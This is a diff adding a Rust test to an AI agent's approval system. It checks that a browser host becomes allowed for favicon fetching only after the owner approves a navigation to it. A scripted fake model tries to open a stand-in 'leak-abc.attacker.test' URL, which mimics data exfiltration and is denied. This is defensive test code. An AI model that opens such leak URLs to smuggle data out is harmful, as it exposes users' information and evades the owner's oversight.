@@ -483,3 +483,49 @@ fn the_always_allow_list_is_closed() {
         }
     }
 }
+
+/// A host is "allowed" (so its favicon may be fetched) only once the owner approved a
+/// navigation to it: not while the card is pending, never when denied.
+#[tokio::test]
+async fn a_site_is_allowed_for_favicons_only_after_the_owner_approved_it() {
+    let env = setup();
+    let browser = tool("browser_open", Effect::Write, PermissionCategory::Browser);
+    let fake = Fake::new(vec![
+        calls(&[(
+            "c1",
+            "browser_open",
+            json!({"url": "https://leak-abc.attacker.test/"}),
+        )]),
+        text("denied"),
+        calls(&[(
+            "c2",
+            "browser_open",
+            json!({"url": "https://webioo.com.tr/x"}),
+        )]),
+        text("ok"),
+    ]);
+    let lp = make_loop(
+        &env.storage,
+        env.bot,
+        &fake,
+        &[t(&browser)],
+        profile(ASK),
+        cfg(Policy::approve_destructive()),
+    );
+    let mut rx = lp.subscribe();
+    let run = lp.run_turn(env.chat, "go").unwrap();
+    let Event::ApprovalNeeded(card) =
+        until(&mut rx, |e| matches!(e, Event::ApprovalNeeded(_))).await
+    else {
+        unreachable!()
+    };
+    assert!(!lp.site_allowed("leak-abc.attacker.test"), "pending card");
+    lp.deny(card.call_id, env.user, None).unwrap();
+    let _ = lp.wait(run).await;
+    assert!(!lp.site_allowed("leak-abc.attacker.test"), "denied");
+    assert!(!lp.site_allowed("webioo.com.tr"));
+    approve(&env, &lp, ApprovalScope::Once).await;
+    assert!(lp.site_allowed("webioo.com.tr"));
+    assert!(lp.site_allowed("WEBIOO.com.tr."));
+    assert!(!lp.site_allowed("other.webioo.com.tr"));
+}
